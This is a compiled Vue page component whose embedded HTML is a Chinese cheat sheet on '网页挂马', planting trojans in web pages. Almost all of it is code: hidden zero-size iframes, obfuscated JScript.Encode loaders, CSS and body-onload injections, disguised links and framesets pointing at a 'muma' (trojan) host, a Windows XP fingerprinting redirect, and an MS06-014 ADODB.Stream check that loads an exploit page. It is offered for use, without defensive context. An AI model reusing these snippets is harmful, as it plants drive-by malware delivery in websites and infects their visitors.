import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as t,c as i,e as n}from"./app-4cb496de.js";const a={},d=n(`<h1 id="框架挂马" tabindex="-1"><a class="header-anchor" href="#框架挂马" aria-hidden="true">#</a> 框架挂马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;iframe src=地址 width=0 height=0&gt;&lt;/iframe&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="js文件挂马首先将以下代码" tabindex="-1"><a class="header-anchor" href="#js文件挂马首先将以下代码" aria-hidden="true">#</a> js文件挂马首先将以下代码</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>document.write(&quot;&lt;iframe width=&#39;0&#39; height=&#39;0&#39; src=&#39;地址&#39;&gt;&lt;/iframe&gt;&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>保存为xxx.js，则JS挂马代码为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;script language=javascript src=xxx.js&gt;&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="js变形加密" tabindex="-1"><a class="header-anchor" href="#js变形加密" aria-hidden="true">#</a> js变形加密</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;SCRIPT language=&quot;JScript.Encode&quot; src=http://www.upx.com.cn/muma.txt&gt;&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>muma.txt可改成任意后缀</p><h1 id="body挂马" tabindex="-1"><a class="header-anchor" href="#body挂马" aria-hidden="true">#</a> body挂马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;body onload=&quot;window.location=&#39;地址&#39;;&quot;&gt;&lt;/body&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="隐蔽挂马" tabindex="-1"><a class="header-anchor" href="#隐蔽挂马" aria-hidden="true">#</a> 隐蔽挂马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>top.document.body.innerHTML = top.document.body.innerHTML + &#39;\\r\\n&lt;iframe src=&quot;http://www.upx.com.cn/muma.htm/&quot;&gt;&lt;/iframe&gt;&#39;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="css中挂马" tabindex="-1"><a class="header-anchor" href="#css中挂马" aria-hidden="true">#</a> css中挂马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body {background-image: url(&#39;javascript:document.write(&quot;&lt;script src=http://www.upx.com.cn/muma.js&gt;&lt;/script&gt;&quot;)&#39;)}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="jaja挂马" tabindex="-1"><a class="header-anchor" href="#jaja挂马" aria-hidden="true">#</a> JAJA挂马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;SCRIPT language=javascript&gt;window.open (&quot;地址&quot;,&quot;&quot;,&quot;toolbar=no,location=no,directories=no,status=no,menubar=no,scro llbars=no,width=1,height=1&quot;);&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="图片伪装" tabindex="-1"><a class="header-anchor" href="#图片伪装" aria-hidden="true">#</a> 图片伪装</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;html&gt;
&lt;iframe src=&quot;网马地址&quot; height=0 width=0&gt;&lt;/iframe&gt;
&lt;imgsrc=&quot;图片地址&quot;&gt;&lt;/center&gt;
&lt;/html&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="伪装调用" tabindex="-1"><a class="header-anchor" href="#伪装调用" aria-hidden="true">#</a> 伪装调用：</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;frameset rows=&quot;444,0&quot; cols=&quot;*&quot;&gt;
&lt;frame src=&quot;打开网页&quot; framborder=&quot;no&quot; scrolling=&quot;auto&quot; noresize marginwidth=&quot;0&quot;margingheight=&quot;0&quot;&gt;
&lt;frame src=&quot;网马地址&quot; frameborder=&quot;no&quot; scrolling=&quot;no&quot; noresize marginwidth=&quot;0&quot;margingheight=&quot;0&quot;&gt;
&lt;/frameset&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="高级欺骗" tabindex="-1"><a class="header-anchor" href="#高级欺骗" aria-hidden="true">#</a> 高级欺骗</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;a href=&quot;http://www.163.com(迷惑连接地址，显示这个地址指向木马地址)&quot; onMouseOver=&quot;www_163_com(); return true;&quot;&gt; 页面要显示的内容 &lt;/a&gt;
&lt;SCRIPT Language=&quot;JavaScript&quot;&gt;
function www_163_com ()
{
var url=&quot;网马地址&quot;;
open(url,&quot;NewWindow&quot;,&quot;toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10&quot;);
}
&lt;/SCRIPT&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="判断系统代码" tabindex="-1"><a class="header-anchor" href="#判断系统代码" aria-hidden="true">#</a> 判断系统代码&lt;</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;
&lt;HTML&gt;
&lt;HEAD&gt;&lt;TITLE&gt;404&lt;/TITLE&gt;
&lt;META http-equiv=Content-Type content=&quot;text/html; charset=windows-1252&quot;&gt;
&lt;META content=&quot;MSHTML 6.00.2900.2769&quot; name=GENERATOR&gt;&lt;/HEAD&gt;
&lt;BODY&gt;
&lt;SCRIPT language=javascript&gt;
window.status=&quot;&quot;;
if(navigator.userAgent.indexOf(&quot;Windows NT 5.1&quot;) != -1)
window.location.href=&quot;tk.htm&quot;;
else
window.location.href=&quot;upx06014.htm&quot;;
&lt;/SCRIPT&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="判断是否有ms06014代码" tabindex="-1"><a class="header-anchor" href="#判断是否有ms06014代码" aria-hidden="true">#</a> 判断是否有ms06014代码</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;script language=VBScript&gt;
on error resume next
set server = document.createElement_x(&quot;object&quot;)
server.setAttribute &quot;classid&quot;, &quot;clsid:10072CEC-8CC1-11D1-986E-00A0C955B42E&quot;
set File = server.createobject(Adodb.Stream,&quot;&quot;)
if Not Err.Number = 0 then
err.clear
document.write (&quot;&lt;iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0&gt;&quot;)
else
document.write (&quot;&lt;iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0&gt;&quot;)
end if
&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="智能读取js的代码demo" tabindex="-1"><a class="header-anchor" href="#智能读取js的代码demo" aria-hidden="true">#</a> 智能读取js的代码demo</h1><p>//读娶src的对象</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>var v = document.getElementByIdx_x(&quot;advjs&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>//读娶src的参数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>var u_num = getUrlParameterAdv(&quot;showmatrix_num&quot;,v.getAttribute(&#39;src&#39;));
document.write(&quot;&lt;iframe src=\\&quot;http://www.upx.com.cn/1/&quot;+u_num+&quot;.htm\\&quot; width=\\&quot;0\\&quot; height=\\&quot;0\\&quot; frameborder=\\&quot;0\\&quot;&gt;&lt;/iframe&gt;&quot;);
document.writeln(&quot;&lt;!DOCTYPE HTML PUBLIC \\&quot;-\\/\\/W3C\\/\\/DTD HTML 4.0 Transitional\\/\\/EN\\&quot;&gt;&quot;);
document.writeln(&quot;&lt;HTML&gt;&lt;HEAD&gt;&quot;);
document.writeln(&quot;&lt;META http-equiv=Content-Type content=\\&quot;text\\/html; charset=big5\\&quot;&gt;&quot;);
document.writeln(&quot;&lt;META content=\\&quot;MSHTML 6.00.2900.3059\\&quot; name=GENERATOR&gt;&lt;\\/HEAD&gt;&quot;);
document.writeln(&quot;&lt;BODY&gt; &quot;);
document.writeln(&quot;&lt;DIV style=\\&quot;CURSOR: url(\\&#39;http:\\/\\/www.upx.com.cn\\/demo.js\\&#39;)\\&quot;&gt;&quot;);
document.writeln(&quot;&lt;DIV &quot;);
document.writeln(&quot;style=\\&quot;CURSOR: url(\\&#39;http:\\/\\/www.upx.com.cn\\/demo.js\\&#39;)\\&quot;&gt;&lt;\\/DIV&gt;&lt;\\/DIV&gt;&lt;\\/BODY&gt;&lt;\\/HTML&gt;&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>//分析src的参数函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function getUrlParameterAdv(asName,lsURL){
loU = lsURL.split(&quot;?&quot;);
if (loU.length&gt;1){
var loallPm = loU[1].split(&quot;&amp;&quot;);
for (var i=0; i&lt;loallPm.length; i++){
var loPm = loallPm.split(&quot;=&quot;);
if (loPm[0]==asName){
if (loPm.length&gt;1){
return loPm[1];
}else{
return &quot;&quot;;
}
}
}
}
return null;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,34),l=[d];function s(r,u){return t(),i("div",null,l)}const v=e(a,[["render",s],["__file","网页挂马.html.vue"]]);export{v as default};
